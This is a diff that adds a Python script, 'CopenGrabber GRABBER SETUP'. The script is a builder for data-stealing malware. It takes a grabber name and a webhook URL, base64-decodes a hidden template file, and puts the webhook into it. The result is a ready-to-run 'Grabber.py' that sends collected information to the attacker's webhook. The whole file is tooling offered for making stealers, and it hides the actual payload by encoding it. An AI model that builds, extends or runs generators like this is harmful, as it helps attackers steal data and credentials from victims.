@@ -1,0 +1,50 @@
+import sys
+import base64 as xy
+import codecs
+#-------------------------------------------------
+print("""
+     \033[0;32mCopenGrabber GRABBER SETUP\033[0m
+----------------------------------------
+
+1) Create Grabber
+2) Exit
+""")
+
+u = input("Enter a choice: ")
+
+while True:
+  if u == "1":
+    break
+  elif u == "2":
+    sys.exit("User closed program!")
+  else:
+    print("Invalid Choice!")
+    u = input("Enter a choice: ")
+
+n = input("\nWhat do you want to name the grabber (this will show up on the webhook): ")
+w = input("\nEnter the webhook you want to send the information to: ")
+
+
+y = open("template.copengrab", "rt")
+x = open("y.txt", "a+")
+
+xy_message = y.read()
+xy_bytes = xy_message.encode('ascii')
+message_b = xy.b64decode(xy_bytes)
+x.write(message_b.decode("ascii", "replace"))
+y.close()
+x.close()
+
+x = open("y.txt", "rt")
+z = open(n+"_Grabber.py", "wt")
+#for each line in the input file
+for l in x:
+  z.write(l.replace('FFOUUIP Method', w))
+#close input and output files
+z.close()
+x.close()
+
+x = open("y.txt", "w")
+x.write("Decoded Successully!")
+
+print("\n\n\033[0;32mGrabber Created!\033[0m\n\nGo to the same directory as this grabber setup and look for "+n+"_Grabber.py")
